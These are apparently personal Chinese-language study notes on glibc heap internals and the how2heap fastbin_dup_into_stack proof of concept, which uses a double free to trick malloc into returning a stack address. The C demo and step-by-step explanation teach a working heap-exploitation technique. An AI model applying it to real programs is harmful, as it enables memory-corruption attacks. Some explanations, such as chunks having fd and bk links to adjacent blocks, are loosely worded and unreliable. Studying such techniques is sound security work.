
### tips：
**prev_size**, 如果该 `chunk` 的 **物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）** 是空闲的话，那该字段记录的是前一个 `chunk` 的大小 (包括 `chunk` 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。**这里的前一 `chunk` 指的是较低地址的 `chunk`** 。

### 前提要点一：

通过`malloc`申请内存时，返回的地址通常是指向`chunk`结构中用户数据区域的起始地址。具体来说：

1. **`malloc`返回的地址指向用户数据区域**：  
   根据和，`malloc`申请的内存被称作`chunk`，其结构包含两个部分：`chunk头`和`用户数据区`。当调用`malloc`时，返回的地址是用户数据区的起始地址，而`chunk头`则包含管理信息（如前一个块的大小、当前块的大小等）。因此，`malloc`返回的地址直接指向用户数据区域，而不是整个`chunk`结构。

2. **`chunk头`的作用**：  
   `chunk头`主要用于管理堆内存的分配和释放。例如，`fd`和`bk`指针分别指向相邻的前一个和后一个块，用于形成双向链表，以便于内存的合并和管理。此外，`prev_size`字段记录了前一个块的大小，而`size`字段记录了当前块的大小。

3. **申请的地址与实际分配的关系**：  
   在某些情况下，如果申请的大小较小且正好匹配fastbin中的某个块，则该块会被直接分配给用户使用。此时，返回的地址即为该块的用户数据区域起始地址。如果块被分配到其他管理列表（如unsorted bin或small bin），则需要进一步处理，但最终返回的地址仍然指向用户数据区域。

4. **fastbin中的特殊情况**：  
   如果申请的大小正好匹配fastbin中的某个块，则这块内存会被直接分配并返回。此时，fastbin中的块已经处于空闲状态，其`fd`和`bk`指针可能为0或指向其他块。因此，在这种情况下，返回的地址仍然是用户数据区域的起始地址。

综上，当你通过`malloc`申请内存时，返回的地址指向的是`chunk`结构中用户数据区域的起始地址，而不是整个`chunk`结构。这部分内存由用户直接控制和使用。


### 前提要点二：

在 `fastbin`中 ，每个 `free chunk`都有一个 `fd`（forward）指针 ，它用于链接到下一个空闲 `free chunk` 。具体来说 ， `fd` **指向下一个 `free chunk`的头** ，而不是用户数据区域 。具体来说：

1. **`fast bin`的结构**  
   `fast bin`是一个单向链表 ，每个 `free chunk`通过 `fd`指针链接到下一个 `free chunk` 。链表的头部是最近释放的空闲 `free chunk` ，尾部是第一个释放的空闲 `free chunk` 。

2. **`free chunk`的结构**  
   当 `free chunk`处于空闲状态时 ，它的头部包含两个重要字段 ：  
   - **`prev_size`** ：前一个 `free chunk`的大小 （如果前一个 `free chunk`正在使用中 ，则此字段无效 ）。  
   - **`size`** ：当前 `free chunk`的大小 。  
   紧接着这两个字段之后就是 **`fd`** ，它 **指向下一个空闲 `free chunk`的头** 。

3. **`malloc()`返回的用户数据区域**  
   当调用 `malloc()`时 ，返回给用户的地址是 **用户数据区域的起始地址** ，而不是整个 `free chunk`的头 。因此 ，用户无法直接访问 `free chunk`的头或 `fd`字段 。

综上，在 `fast bin`中 ，每个空闲 `free chunk`的头包含一个 **`fd`** ，它 **指向下一个空闲 `free chunk`的头** 。这种设计使得 `malloc()`能够快速找到并分配合适大小的空闲内存块  。

## how2heap的源码分析

```c
#include <stdio.h>
#include <stdlib.h>
int main()

{
    fprintf(stderr, "This file extends on fastbin_dup.c by tricking malloc into\n"
           "returning a pointer to a controlled location (in this case, the stack).\n");

    unsigned long long stack_var;

    fprintf(stderr, "The address we want malloc() to return is %p.\n", 8+(char *)&stack_var);

  

    fprintf(stderr, "Allocating 3 buffers.\n");

    int *a = malloc(8);

    int *b = malloc(8);

    int *c = malloc(8);

    fprintf(stderr, "1st malloc(8): %p\n", a);
    fprintf(stderr, "2nd malloc(8): %p\n", b);
    fprintf(stderr, "3rd malloc(8): %p\n", c);
    fprintf(stderr, "Freeing the first one...\n");

    free(a);
    fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);

    // free(a);
    fprintf(stderr, "So, instead, we'll free %p.\n", b);

    free(b);

  

    fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);

    free(a);

    fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
        "We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);

    unsigned long long *d = malloc(8);

    fprintf(stderr, "1st malloc(8): %p\n", d);
    fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
    fprintf(stderr, "Now the free list has [ %p ].\n", a);
    fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
        "so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
        "so that malloc will think there is a free chunk there and agree to\n"
        "return a pointer to it.\n", a);

    stack_var = 0x20;

    fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);

    *d = (unsigned long long) (((char*)&stack_var) - sizeof(d));

        fprintf(stderr, "this is sizeof(d):%d\n", sizeof(d));
    fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
    fprintf(stderr, "4th malloc(8): %p\n", malloc(8));

}
```
![[Pasted image 20250409151658.png]]

步骤流程：

首先申请三个malloc(0x8),然后依次free前两个chunk，再free(a)就会实现double,后面我们就需要通过double free进行use after free的利用了。
当我们实现double free 的时候就会像第一个图的第三个fastbin 的结构一样了。我们现在需要想办法去将chunk的地址搬到stack上去，这就需要我们需要将chunk a 的fd指针指向stack上的地址，这样才可以将这个fake_chunk申请出来。

源码中定义了一个stack的地址用来装饰成fake_chunk的，我们可以看到申请的stack的地址内存的是0x20字节，为什么要填0x20字节呢？这是因为我们如果需要chunk a 的fd指针申请出fake_chunk的话就需要进行一个fastbin脱链的检查，就是检查要申请的这块地址的size是否是和这个fastbin链表的大小是一样的，这个链表存的都是0x20的大小，所以我们需要也构造一个0x20的大小，然后我们需要通过double free申请出来chunk a将其地址（malloc出的地址也就是fd指针位置）改为fake_chunk的pre_size的地址，也就是元头部首部数据。这样就可以达到下图第四个fastbin的结构的效果了。

![[Pasted image 20250409160920.png]]
![[Pasted image 20250409161013.png]]
这时我们将将chunk b,chunk a,fake_chunk依次申请出来就实现了heap地址到stack地址的迁移了。
![[Pasted image 20250409153102.png]]

![[Pasted image 20250409160300.png]]



也挺好的文章：[how2heap—glibc 2.23—fastbin_dup_into_stack_2.23 fastbin-CSDN博客](https://blog.csdn.net/xy_369/article/details/131036856)